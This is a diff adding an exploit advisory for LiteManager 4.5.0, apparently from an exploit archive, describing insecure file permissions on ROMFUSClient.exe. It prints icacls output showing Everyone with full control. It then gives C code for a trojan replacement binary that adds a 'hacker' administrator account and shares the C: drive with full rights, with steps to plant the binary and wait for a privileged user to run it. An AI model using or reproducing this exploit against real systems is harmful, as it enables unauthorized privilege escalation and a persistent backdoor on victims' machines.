@@ -1,0 +1,38 @@
+﻿# Exploit Title: LiteManager 4.5.0 - Insecure File Permissions
+# Exploit Author: ZwX
+# Exploit Date: 2019-11-21
+# Vendor Homepage : LiteManager Team
+# Software Link: http://html.tucows.com/preview/1594042/LiteManager-Free?q=remote+support
+# Tested on OS: Windows 7 
+
+
+# Proof of Concept (PoC):
+==========================
+
+
+C:\Program Files\LiteManagerFree - Server>icacls *.exe
+ROMFUSClient.exe Everyone:(F)
+                 AUTORITE NT\Système:(I)(F)
+                 BUILTIN\Administrateurs:(I)(F)
+                 BUILTIN\Utilisateurs:(I)(RX)
+				 
+				 
+#Exploit code(s): 
+=================
+
+1) Compile below 'C' code name it as "ROMFUSClient.exe"
+
+#include<windows.h>
+
+int main(void){
+ system("net user hacker abc123 /add");
+ system("net localgroup Administrators hacker  /add");
+ system("net share SHARE_NAME=c:\ /grant:hacker,full");
+ WinExec("C:\\Program Files\\LiteManagerFree\\~ROMFUSClient.exe",0);
+return 0;
+} 
+
+2) Rename original "ROMFUSClient.exe" to "~ROMFUSClient.exe"
+3) Place our malicious "ROMFUSClient.exe" in the LiteManagerFree directory
+4) Disconnect and wait for a more privileged user to connect and use ROMFUSClient IDE. 
+Privilege Successful Escalation
